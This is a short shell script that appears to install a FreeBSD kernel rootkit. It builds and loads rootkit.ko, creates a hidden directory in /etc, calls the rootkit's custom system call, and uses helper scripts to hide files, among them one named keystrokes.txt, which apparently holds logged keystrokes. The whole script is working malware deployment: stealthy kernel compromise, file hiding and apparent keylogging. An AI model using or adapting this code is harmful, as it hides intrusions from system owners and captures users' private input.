#!/bin/sh

rm -rf /etc/good_luck_finding_this

make clean
make
mkdir /etc/good_luck_finding_this
kldload ./rootkit.ko

cc syscall.c -o syscall

sys_num=$(cat /etc/good_luck_finding_this/syscall_number.txt)

./syscall $sys_num 1

./add.sh syscall_number.txt
./add.sh good_luck_finding_this
./add.sh keystrokes.txt

./setflags.sh syscall_number.txt 01
./setflags.sh good_luck_finding_this 00
./setflags.sh keystrokes.txt 01
